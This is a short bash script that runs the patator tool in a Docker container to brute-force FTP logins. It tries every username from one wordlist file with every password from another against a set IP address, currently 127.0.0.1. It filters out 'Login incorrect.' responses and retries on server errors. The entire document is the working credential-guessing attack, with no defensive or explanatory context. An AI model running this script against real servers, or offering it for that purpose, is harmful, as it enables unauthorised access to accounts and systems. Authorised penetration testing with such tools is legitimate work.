#!/usr/bin/env bash

users='/tmp/users.txt'
pass='/tmp/pass.txt'
ip='127.0.0.1'
ignore='Login incorrect.'

docker run --rm -it -v $users:/F0 -v $pass:/F1 \
patator ftp_login host=$ip user=FILE0 password=FILE1 0=/F0 1=/F1 \
-x ignore:fgrep="$ignore" -x ignore,reset,retry:code=500
